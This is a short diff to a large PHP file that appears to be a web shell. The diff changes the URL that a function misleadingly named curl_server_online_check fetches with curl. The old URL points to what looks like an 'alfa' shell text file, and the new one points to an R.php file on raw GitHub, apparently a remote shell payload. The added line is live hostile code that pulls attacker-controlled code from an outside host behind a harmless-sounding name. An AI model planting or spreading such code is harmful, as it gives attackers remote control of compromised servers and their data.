@@ -200,7 +200,7 @@ if (!defined('PHP_VERSION_ID')) {
 function curl_server_online_check(){
     if (function_exists('curl_init')){
         @$ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, "https://marslogs.co.id/shell/shell/alfa-terbaru.txt");
+        curl_setopt($ch, CURLOPT_URL, "https://raw.githubusercontent.com/shellag6561-ux/chil/refs/heads/main/R.php");
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
         curl_setopt($ch, CURLOPT_HEADER, 0);
         @curl_exec($ch);
@@ -8673,3 +8673,4 @@ fb_log("Page generated in ".number_format((getmicrotime()-$script_init_time), 3,
 // | THE END
 // +--------------------------------------------------
 ?>
+
